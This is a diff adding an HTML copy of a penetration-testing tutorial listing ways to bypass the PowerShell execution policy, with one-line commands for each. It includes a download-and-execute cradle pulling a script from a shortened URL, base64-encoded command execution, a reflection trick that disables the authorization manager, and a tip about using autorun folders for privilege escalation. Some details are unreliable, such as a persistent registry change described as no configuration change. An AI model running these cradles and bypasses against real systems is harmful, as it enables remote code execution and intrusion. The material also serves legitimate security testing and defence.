@@ -1,0 +1,92 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Execution Bypass</title>
+</head><body>https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ <br/>
+<br/>
+Paste the Script into an Interactive PowerShell Console<br/>
+<br/>
+Echo the Script and Pipe it to PowerShell Standard In<br/>
+&nbsp;Simply ECHO your script into PowerShell standard input. This technique does not result in a configuration change or require writing to disk.<br/>
+&nbsp;Echo Write-Host "My voice is my passport, verify me." &nbsp;| PowerShell.exe -noprofile -<br/>
+<br/>
+Read Script from a File and Pipe to PowerShell Standard In<br/>
+&nbsp;Use the Windows "type" command or PowerShell "Get-Content" command to read your script from the disk and pipe it into PowerShell standard input. This technique does not result in a configuration change, but does require writing your script to disk. However, you could read it from a network share if you're trying to avoid writing to the disk.<br/>
+&nbsp;Get-Content .runme.ps1 | PowerShell.exe -noprofile -<br/>
+&nbsp;TYPE .runme.ps1 | PowerShell.exe -noprofile -<br/>
+<br/>
+Download Script from URL and Execute with Invoke Expression<br/>
+&nbsp;This technique can be used to download a PowerShell script from the internet and execute it without having to write to disk. It also doesn't result in any configuration changes. I have seen it used in many creative ways, but most recently saw it being referenced in a nice PowerSploit blog by Matt Graeber.<br/>
+&nbsp;powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"<br/>
+<br/>
+Use the Command Switch<br/>
+&nbsp;This technique is very similar to executing a script via copy and paste, but it can be done without the interactive console. It's nice for simple script execution, but more complex scripts usually end up with parsing errors. This technique does not result in a configuration change or require writing to disk. Example 1: Full command<br/>
+&nbsp;Powershell -command "Write-Host 'My voice is my passport, verify me.'<br/>
+Example 2: Short command<br/>
+&nbsp;Powershell -c "Write-Host 'My voice is my passport, verify me.'"<br/>
+It may also be worth noting that you can place these types of PowerShell commands into batch files and place them into autorun locations (like the all users startup folder) to help during privilege escalation.<br/>
+<br/>
+Use the EncodeCommand Switch<br/>
+&nbsp;This is very similar to the "Command" switch, but all scripts are provided as a Unicode/base64 encoded string. Encoding your script in this way helps to avoid all those nasty parsing errors that you run into when using the "Command" switch. This technique does not result in a configuration change or require writing to disk. The sample below was taken from Posh-SecMod. The same toolkit includes a nice little compression method for reducing the size of the encoded commands if they start getting too long. Example 1: Full command<br/>
+&nbsp;$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand<br/>
+<br/>
+Example 2: Short command using encoded string<br/>
+powershell.exe -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA<br/>
+<br/>
+Use the Invoke-Command Command<br/>
+&nbsp;This is a fun option that I came across on the Obscuresec blog. It's typically executed through an interactive PowerShell console or one liner using the "Command" switch, but the cool thing is that it can be used to execute commands against remote systems where PowerShell remoting has been enabled. This technique does not result in a configuration change or require writing to disk.<br/>
+&nbsp;invoke-command -scriptblock {Write-Host "My voice is my passport, verify me."}<br/>
+Based on the Obscuresec blog, the command below can also be used to grab the execution policy from a remote computer and apply it to the local computer.<br/>
+&nbsp;invoke-command -computername Server01 -scriptblock {get-executionpolicy} | set-executionpolicy -force<br/>
+<br/>
+Use the Invoke-Expression Command<br/>
+&nbsp;This is another one that's typically executed through an interactive PowerShell console or one liner using the "Command" switch. This technique does not result in a configuration change or require writing to disk. Below I've listed are a few common ways to use Invoke-Expression to bypass the execution policy. Example 1: Full command using Get-Content<br/>
+&nbsp;Get-Content .runme.ps1 | Invoke-Expression<br/>
+Example 2: Short command using Get-Content<br/>
+&nbsp;GC .runme.ps1 | iex<br/>
+<br/>
+Use the "Bypass" Execution Policy Flag<br/>
+This is a nice flag added by Microsoft that will bypass the execution policy when you're executing scripts from a file. When this flag is used Microsoft states that "Nothing is blocked and there are no warnings or prompts". This technique does not result in a configuration change or require writing to disk.<br/>
+PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1<br/>
+<br/>
+Use the "Unrestricted" Execution Policy Flag<br/>
+&nbsp;This similar to the "Bypass" flag. However, when this flag is used Microsoft states that it "Loads all configuration files and runs all scripts. If you run an unsigned script that was downloaded from the Internet, you are prompted for permission before it runs." This technique does not result in a configuration change or require writing to disk.<br/>
+&nbsp;PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1<br/>
+<br/>
+Use the "Remote-Signed" Execution Policy Flag<br/>
+&nbsp;Create your script then follow the tutorial written by Carlos Perez to sign it. Finally,run it using the command below:<br/>
+&nbsp;PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1<br/>
+<br/>
+Disable ExecutionPolicy by Swapping out the AuthorizationManager<br/>
+&nbsp;This is really creative one I came across on http://www.nivot.org. The function below can be executed via an interactive PowerShell console or by using the "command" switch. Once the function is called it will swap out the "AuthorizationManager" with null. As a result, the execution policy is essentially set to unrestricted for the remainder of the session. This technique does not result in a persistant configuration change or require writing to disk. However, it the change will be applied for the duration of the session.<br/>
+&nbsp;function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))} &nbsp;Disable-ExecutionPolicy &nbsp;.runme.ps1<br/>
+<br/>
+Set the ExcutionPolicy for the Process Scope<br/>
+&nbsp;As we saw in the introduction, the execution policy can be applied at many levels. This includes the process which you have control over. Using this technique the execution policy can be set to unrestricted for the duration of your Session. Also, it does not result in a configuration change, or require writing to the disk. I originally found this technique on the <a href="http://roo7break.co.uk/?page_id=611">r007break blog</a>.<br/>
+&nbsp;Set-ExecutionPolicy Bypass -Scope Process<br/>
+<br/>
+Set the ExcutionPolicy for the CurrentUser Scope via Command<br/>
+&nbsp;This option is similar to the process scope, but applies the setting to the current user's environment persistently by modifying a registry key. Also, it does not result in a configuration change, or require writing to the disk. I originally found this technique on the r007break blog<br/>
+&nbsp;Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted<br/>
+<br/>
+Set the ExcutionPolicy for the CurrentUser Scope via the Registry<br/>
+&nbsp;In this example I've shown how to change the execution policy for the current user's environment persistently by modifying a registry key directly.<br/>
+&nbsp;HKEY_CURRENT_USER\Software\MicrosoftPowerShell\1\ShellIds\Microsoft.PowerShell<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+References:<br/>
+http://blogs.msdn.com/b/powershell/archive/2008/09/30/powershell-s-security-guiding-principles.aspx<br/>
+http://obscuresecurity.blogspot.com/2011/08/powershell-executionpolicy.html<br/>
+http://roo7break.co.uk/?page_id=611<br/>
+http://technet.microsoft.com/en-us/library/hh849694.aspx<br/>
+http://technet.microsoft.com/en-us/library/hh849812.aspx<br/>
+http://technet.microsoft.com/en-us/library/hh849893.aspx<br/>
+http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html<br/>
+http://www.hanselman.com/blog/SigningPowerShellScripts.aspx<br/>
+http://www.darkoperator.com/blog/2013/3/5/powershell-basics-execution-policy-part-1.html<br/>
+http://www.nivot.org/blog/post/2012/02/10/Bypassing-Restricted-Execution-Policy-in-Code-or-in-Scriptfrom<br/>
+http://www.powershellmagazine.com/2014/07/08/powersploit/<br/>
+</body></html>
